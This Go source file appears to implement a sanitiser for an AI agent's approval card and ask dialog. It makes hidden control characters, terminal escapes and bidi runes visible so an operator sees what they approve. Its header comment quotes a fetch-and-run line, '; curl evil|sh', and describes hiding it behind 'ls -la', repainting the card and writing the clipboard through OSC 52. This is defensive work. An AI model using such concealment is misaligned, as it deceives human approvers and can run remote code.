package main

// card_text.go — the decision-surface scrub (audit KA-001 / p09-001).
//
// The approval card and the ask dialog show text the agent wrote: the tool
// name, the decoded tool input (keys and values), the summary, the question
// and its options. The daemon sanitizes the JSON *text*, where an escape is
// the six printable bytes \u001b, so it passes; json.Unmarshal here turns it
// back into a raw ESC. Rendered as-is, \e[8m hides "; curl evil|sh" behind
// "ls -la", CSI cursor-up/erase repaints the card and OSC 52 writes the
// operator's clipboard — on the exact screen whose job is to show the
// operator what they are approving.
//
// scrubVTStrict is the wrong tool for this surface on its own: it DROPS what
// it does not like, so a concealed payload would come out as plain text but
// the operator would never learn that the agent tried to hide something.
// cardText instead makes every invisible or terminal-active rune VISIBLE:
//
//   ESC and the other C0 controls -> their Control Pictures (U+2400 + c, so
//                                    ESC -> ␛, BEL -> ␇, CR -> ␍), DEL -> ␡
//   C1 controls (U+0080-U+009F)   -> "<U+009B>"
//   bidi overrides/isolates,
//   zero-width and other format
//   runes (isHostileFormat)       -> "<U+202E>"
//   invalid UTF-8 bytes           -> U+FFFD
//
// \n and \t pass: wrapCells splits on the first and expands the second. The
// result then goes through scrubVTStrict, which by then has no escape or
// control left to act on and only applies the halfwidth sound-mark cap (the
// width divergence uniseg cannot see), so that policy stays in one place.
// Every substitute is printable and has a width the measuring code agrees
// on, and the substitution happens BEFORE layout, so wrapping is computed on
// what is actually drawn. Text with nothing to substitute is returned
// unchanged, so a benign card renders byte-for-byte as before.

import (
	"fmt"
	"strings"
	"unicode/utf8"
)

// cardText is the one helper every agent-supplied string on the approval
// card and the ask dialog goes through before layout. See the file comment.
func cardText(s string) string {
	if !cardTextDirty(s) {
		return s
	}
	var b strings.Builder
	b.Grow(len(s) + 8)
	for i := 0; i < len(s); {
		r, sz := utf8.DecodeRuneInString(s[i:])
		switch {
		case r == utf8.RuneError && sz == 1:
			b.WriteRune(utf8.RuneError)
		case r == '\n' || r == '\t':
			b.WriteRune(r)
		case r < 0x20:
			b.WriteRune(0x2400 + r)
		case r == 0x7f:
			b.WriteRune(0x2421)
		case r >= 0x80 && r <= 0x9f, isHostileFormat(r):
			fmt.Fprintf(&b, "<U+%04X>", r)
		default:
			b.WriteString(s[i : i+sz])
		}
		i += sz
	}
	return scrubVTStrict(b.String())
}

// cardTextDirty reports whether s holds anything cardText would change.
func cardTextDirty(s string) bool {
	for i := 0; i < len(s); {
		r, sz := utf8.DecodeRuneInString(s[i:])
		switch {
		case r == utf8.RuneError && sz == 1:
			return true
		case r == '\n' || r == '\t':
		case r < 0x20 || (r >= 0x7f && r <= 0x9f) || isHostileFormat(r) || isHalfwidthMark(r):
			return true
		}
		i += sz
	}
	return false
}
